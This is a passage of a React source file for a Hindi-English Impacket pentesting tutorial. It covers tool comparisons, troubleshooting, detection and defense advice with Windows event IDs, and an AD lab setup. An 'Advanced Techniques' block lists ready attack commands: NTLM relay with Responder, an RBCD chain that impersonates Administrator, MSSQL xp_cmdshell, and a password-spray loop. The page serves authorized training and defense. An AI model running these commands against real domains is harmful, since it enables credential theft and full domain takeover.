            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">SMB Execution</td><td className="py-2 px-3">psexec, smbexec, wmiexec, atexec, dcomexec</td><td className="py-2 px-3">psexec, smbexec, wmiexec, atexec</td><td className="py-2 px-3">No</td><td className="py-2 px-3">psexec, smb</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">WinRM</td><td className="py-2 px-3">No</td><td className="py-2 px-3">Yes</td><td className="py-2 px-3">Yes (best)</td><td className="py-2 px-3">Yes</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Credential Dump</td><td className="py-2 px-3">secretsdump (best)</td><td className="py-2 px-3">Yes</td><td className="py-2 px-3">Limited</td><td className="py-2 px-3">Yes</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Kerberos</td><td className="py-2 px-3">Full support</td><td className="py-2 px-3">Partial</td><td className="py-2 px-3">No</td><td className="py-2 px-3">Partial</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">NTLM Relay</td><td className="py-2 px-3">ntlmrelayx</td><td className="py-2 px-3">No</td><td className="py-2 px-3">No</td><td className="py-2 px-3">smb_relay</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">MSSQL</td><td className="py-2 px-3">mssqlclient</td><td className="py-2 px-3">Yes</td><td className="py-2 px-3">No</td><td className="py-2 px-3">mssql_login</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Network Scan</td><td className="py-2 px-3">No (manual)</td><td className="py-2 px-3">Yes (auto)</td><td className="py-2 px-3">No</td><td className="py-2 px-3">Yes</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Scripting</td><td className="py-2 px-3">Excellent</td><td className="py-2 px-3">Good</td><td className="py-2 px-3">Limited</td><td className="py-2 px-3">Good</td></tr>
            <tr><td className="py-2 px-3 text-white">Resource Usage</td><td className="py-2 px-3">Lightweight</td><td className="py-2 px-3">Lightweight</td><td className="py-2 px-3">Lightweight</td><td className="py-2 px-3">Heavy</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'STATUS_LOGON_FAILURE error आ रहा है', a: 'Username, password, और domain format check करो। domain/user:password format use करो। अगर local account है तो ./user:password format use करो। NTLM hash format check करो — aad3b435b51404eeaad3b435b51404ee:HASH ya :HASH.' },
          { q: 'STATUS_ACCESS_DENIED आ रहा है', a: 'User account admin नहीं है। दूसरा user try करो जिसके पास admin rights हों। WMI या DCOM method try करो — psexec के लिए admin चाहिए लेकिन बाकी tools अलग permissions पर काम कर सकते हैं।' },
          { q: 'Connection timeout हो रहा है', a: 'Firewall check करो — port 445 (SMB), 135 (RPC), 1433 (MSSQL) open होने चाहिए। Network connectivity test करो: nmap -p 445,135 target। VPN/Proxy check करो।' },
          { q: 'STATUS_SHARING_VIOLATION error', a: 'SMBv1 disable हो सकता है। -smb2support flag add करो (ntlmrelayx)। या target par SMBv1 enable करवाओ (not recommended)।' },
          { q: 'Kerberos authentication fail हो रहा है', a: 'Time sync check करो — Kerberos में 5 minute tolerance होता है। ntpdate DC_IP से time sync करो। DNS check करो — domain name resolve होना चाहिए। KRB5CCNAME environment variable set करो।' },
          { q: 'secretsdump slow चल रहा है', a: 'बड़े AD environments में NTDS.dit large होता है। -just-dc-user flag से specific user dump करो। -skip-sam और -skip-lsa flags use करो सिर्फ NTDS के लिए।' },
          { q: 'Python version issue आ रहा है', a: 'Impacket Python 3.7+ require करता है। python3 --version check करो। pip3 install impacket --upgrade से latest version install करो। Virtual environment use करो अगर system Python old है।' },
          { q: 'Certificate/SSL error आ रहा है (LDAPS)', a: 'LDAPS connection के लिए CA certificate चाहिए। -dc-ip flag से IP use करो hostname की जगह। Certificate verification skip करने के लिए environment variable set करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        Impacket attacks detect करने और defend करने के तरीके:
      </p>
      <div className="space-y-3 mt-4">
        {[
          { q: 'psexec.py detect कैसे करें?', a: 'Windows Event ID 7045 (Service Install) monitor करो। Sysmon Event ID 17/18 (Named Pipe) check करो। PSEXESVC service name detect होता है। EDR solutions (CrowdStrike, Defender) psexec patterns detect करते हैं।' },
          { q: 'secretsdump detect कैसे करें?', a: 'Event ID 4624 (Logon Type 3) और 4672 (Special Privileges) monitor करो। LSASS access (Event ID 4656) detect करो। Sysmon Event ID 10 (Process Access) से LSASS dump detect होता है। Credential Guard enable करो।' },
          { q: 'Kerberoasting detect कैसे करें?', a: 'Event ID 4769 (TGS Request) monitor करो — अगर बहुत सारे TGS requests आ रहे हैं तो suspicious है। Honey SPN accounts create करो — अगर कोई इनके लिए TGS request करे तो alert। Service accounts के लिए long complex passwords set करो (25+ characters)।' },
          { q: 'NTLM Relay detect कैसे करें?', a: 'SMB signing enable करो (mandatory)। LDAP signing enable करो। Event ID 4624/4625 (Logon) monitor करो। EPA (Extended Protection for Authentication) enable करो। IPv6 DNS resolution disable करो अगर use नहीं कर रहे।' },
          { q: 'Golden Ticket detect कैसे करें?', a: 'Event ID 4768 (TGT Request) monitor करो — अगर same user के लिए multiple TGT requests हैं तो suspicious। KRBTGT password regularly rotate करो (every 180 days)। Anomalous logon patterns detect करो।' },
          { q: 'General defense क्या करें?', a: 'LAPS (Local Admin Password Solution) implement करो। Least privilege principle follow करो। Privileged Access Workstations (PAW) use करो। Tiered admin model implement करो। Regular AD audits करो। BloodHound से attack paths identify करो।' },
          { q: 'SMB Signing enable कैसे करें?', a: 'Group Policy से: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > Microsoft network server: Digitally sign communications (always) = Enabled। Domain Controllers पर default enabled होता है। Workstations पर enable करो।' },
          { q: 'Credential Guard क्या है?', a: 'Windows Credential Guard LSASS को virtualized secure environment में run करता है। यह Mimikatz और secretsdump जैसे tools को LSASS memory access से रोकता है। Windows 10 Enterprise और Server 2016+ में available है।' },
          { q: 'Honeypot accounts कैसे बनाएं?', a: 'Active Directory में fake admin accounts create करो जो कभी use नहीं होते। अगर कोई इन accounts पर attack करे (Kerberoast, AS-REP) तो alert trigger हो। Canary tokens भी use कर सकते हो।' },
          { q: 'Network segmentation से कैसे रोकें?', a: 'Domain Controllers को separate VLAN में रखो। SMB/RPC traffic restrict करो — सिर्फ authorized machines से DC access allow करो। Firewall rules से lateral movement रोको। Micro-segmentation implement करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Lab Environment Setup</h2>
      <p>
        Impacket practice के लिए Active Directory lab बनाना ज़रूरी है:
      </p>
      <CodeBlock
        title="AD Lab Setup"
        code={`# VirtualBox/VMware में 3 VMs:

# 1. Windows Server (Domain Controller):
# - Windows Server 2019/2022 install करो
# - Active Directory Domain Services (ADDS) configure करो
# - Domain: lab.local
# - IP: 192.168.1.1

# 2. Windows 10/11 (Domain Member):
# - Domain join करो: lab.local
# - IP: 192.168.1.10

# 3. Kali Linux (Attacker):
# - Impacket install करो
# - Network: 192.168.1.100
# - DNS: 192.168.1.1 (DC IP)

# Lab configuration:
# - Domain Admin account create करो
# - Service accounts create करो (SPN set)
# - "Do not require preauthentication" user create करो
# - Shares create करो (C$, custom shares)
# - MSSQL Server install करो (optional)

# Docker-based AD lab (quick setup):
# https://github.com/yousukea/activedirectory-lab
# https://github.com/Orange-Cyberdefense/GOAD

# Practice steps:
# 1. SMB enumeration
# 2. Credential dump (secretsdump)
# 3. Pass-the-Hash
# 4. Kerberoasting
# 5. AS-REP Roasting
# 6. Golden Ticket
# 7. NTLM Relay`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced Impacket Usage"
        code={`# 1. Relay Chain (ntlmrelayx + Responder):
# Terminal 1: ntlmrelayx -tf targets.txt -smb2support
# Terminal 2: responder -I eth0 -wF
# Jab victim authenticate karega → relay hoga

# 2. SOCKS Proxy via Relay:
ntlmrelayx.py -t target_ip -smb2support -socks
# Ab socks proxy se access:
proxychains psexec.py user@target_ip

# 3. Machine Account + RBCD:
addcomputer.py domain/user:password -computer-name FAKE$ -computer-pass Pass123
rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write domain/user:password
getST.py -spn cifs/TARGET.domain.local -impersonate Administrator domain/'FAKE$':Pass123
export KRB5CCNAME=Administrator@cifs_TARGET.domain.local@DOMAIN.LOCAL.ccache
psexec.py -k -no-pass domain/Administrator@target

# 4. Delegation Abuse:
findDelegation.py domain/user:password -dc-ip DC_IP
# Constrained Delegation:
getST.py -spn cifs/target.domain.local -impersonate Administrator domain/svc:password
# Unconstrained Delegation:
# Machine par ticket capture करो (Rubeus/Impacket)

# 5. Custom Script — impacket Python API:
from impacket.smbconnection import SMBConnection
conn = SMBConnection('target_ip', 'target_ip')
conn.login('user', 'password', 'domain')
shares = conn.listShares()
for share in shares:
    print(share['shi1_netname'])

# 6. MSSQL Linked Server Exploitation:
mssqlclient.py sa:password@target -windows-auth
SQL> enable_xp_cmdshell
SQL> exec_linked -link LINKED_SERVER -command "whoami"

# 7. Password Spray:
for user in $(cat users.txt); do
    secretsdump.py domain/$user:Password123@target_ip 2>&1 | grep -i "success"
done

# 8. Automated Enumeration:
for ip in $(seq 1 254); do
    smbclient.py user:password@192.168.1.$ip -list 2>&1 | head -1
done`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Impacket kyun use karein jab Metasploit hai?', a: 'Impacket Python-based है — lightweight, scriptable, और fast है। Metasploit heavy है और Ruby-based है। CI/CD में easily integrate होता है। AD pentesting में Impacket standard है। psexec, secretsdump, wmiexec — सब best tools Impacket के हैं।' },
          { q: 'Kya Impacket सिर्फ Windows के लिए है?', a: 'Windows targets के लिए best है लेकिन tools किसी भी OS से run हो सकते हैं (Linux, macOS)। Target Windows machine होनी चाहिए। Kali Linux से Windows domain attack कर सकते हो।' },
          { q: 'Pass-the-Hash कैसे काम करता है?', a: 'NTLM authentication में password का hash directly use होता है — password crack की ज़रूरत नहीं। Hash se authenticate करके access मिल जाता है। Impacket -hashes flag से PTH support करता है।' },
          { q: 'Kerberoasting क्या है?', a: 'Service accounts के SPN (Service Principal Names) के tickets request करके crack करना। Ticket hash crack हो जाए तो service account का password मिल जाता है। GetUserSPNs.py से automate होता है।' },
          { q: 'Golden Ticket vs Silver Ticket क्या difference है?', a: 'Golden Ticket KRBTGT hash से बनता है — full domain access। Silver Ticket specific service account hash से बनता है — specific service access। Golden Ticket ज़्यादा powerful है लेकिन KRBTGT hash चाहिए।' },
          { q: 'Impacket CrackMapExec से कैसे different है?', a: 'CrackMapExec network-wide scanning और exploitation के लिए है — multiple targets एक साथ। Impacket individual target exploitation के लिए best है — ज़्यादा tools और options। दोनों complement करते हैं।' },
          { q: 'secretsdump se क्या-क्या dump होता है?', a: 'SAM database (local users), NTDS.dit (domain users), LSA secrets (service passwords), cached credentials (domain logons), DPAPI secrets (browser passwords, etc.)। Remote और local दोनों से dump कर सकता है।' },
          { q: 'NTLM Relay attack क्या है?', a: 'Victim की NTLM authentication capture करके दूसरे target पर relay करना। ntlmrelayx.py यह करता है। Responder + ntlmrelayx combo बहुत powerful है। SMB signing disable होना चाहिए।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Tool</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">CrackMapExec</td><td className="py-2 px-3">Network-wide exploitation</td><td className="py-2 px-3">Multiple targets, auto spray</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Evil-WinRM</td><td className="py-2 px-3">WinRM shell</td><td className="py-2 px-3">Interactive shell, file upload/download</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Rubeus</td><td className="py-2 px-3">Kerberos abuse (C#)</td><td className="py-2 px-3">Windows-native, evasion</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Mimikatz</td><td className="py-2 px-3">Credential extraction</td><td className="py-2 px-3">LSASS dump, token manipulation</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">BloodHound</td><td className="py-2 px-3">AD attack path analysis</td><td className="py-2 px-3">Graph visualization, shortest path</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Metasploit</td><td className="py-2 px-3">Exploitation framework</td><td className="py-2 px-3">Multi-platform, huge module library</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Responder</td><td className="py-2 px-3">LLMNR/NBT-NS poisoning</td><td className="py-2 px-3">Hash capture, relay setup</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">ldapsearch</td><td className="py-2 px-3">LDAP queries</td><td className="py-2 px-3">AD enumeration, built-in</td></tr>
          </tbody>
        </table>
      </div>

      <div className="success-box mt-8">
        <strong>✅ Pro Tips:</strong>
        <ul className="list-disc list-inside mt-2 space-y-1">
          <li>Impacket + CrackMapExec combo use करो — CME से network-wide scan, Impacket से individual exploitation</li>
          <li>secretsdump से hashes dump करो, hashcat से crack करो — AD pentesting का standard workflow</li>
          <li>Kerberoasting सबसे easy attack है — service accounts के passwords मिल सकते हैं</li>
          <li>psexec से wmiexec try करो — wmiexec stealthier है (no service install)</li>
          <li>Pass-the-Hash से password crack की ज़रूरत नहीं — seedha hash use करो</li>
          <li>ntlmrelayx + Responder combo बहुत powerful है — network पर relay attacks</li>
          <li>Golden Ticket se full domain control मिलता है — KRBTGT hash मिलने पर</li>
          <li>Python scripts लिखो automation के लिए — Impacket library directly import कर सकते हो</li>
          <li>Hamesha authorized pentest engagement में ही use करो — सब कुछ document करो</li>
        </ul>
      </div>

      <div className="warning-box mt-4">
        <strong>⚠️ Final Warning:</strong> Impacket बहुत powerful toolkit है। Unauthorized use illegal है। Active Directory exploitation से पूरा domain compromise हो सकता है — सभी user passwords, admin access, data exfiltration सब possible है। सिर्फ authorized penetration testing में use करो। हमेशा written permission लो। सब कुछ document करो। Report properly लिखो। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत network access अपराध है।
      </div>
    </TutorialLayout>
  )
}
